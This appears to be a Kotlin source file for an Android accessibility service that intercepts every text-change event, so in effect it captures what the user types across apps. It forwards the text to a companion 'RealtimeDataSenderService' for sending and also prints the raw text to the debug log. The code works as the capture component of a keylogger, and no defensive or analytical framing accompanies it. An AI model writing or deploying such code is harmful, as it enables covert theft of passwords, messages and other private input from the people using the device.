package com.example.sender

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.util.Log

class TextWatcherService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.toString()
                if (text.isNotEmpty()) {
                    sendTextToDataService(text)
                }
            }
        }
    }

    private fun sendTextToDataService(text: String) {
        val intent = Intent(this, RealtimeDataSenderService::class.java)
        intent.putExtra("text", text)
        startService(intent)
        Log.d("TextWatcherService", "Sending text to RealtimeDataSenderService: $text")
    }

    override fun onInterrupt() {
        Log.e("TextWatcherService", "Service interrupted")
    }

    override fun onServiceConnected() {
        Log.d("TextWatcherService", "Service connected")
        // Здесь можно настроить конфигурацию сервиса, если необходимо
    }
}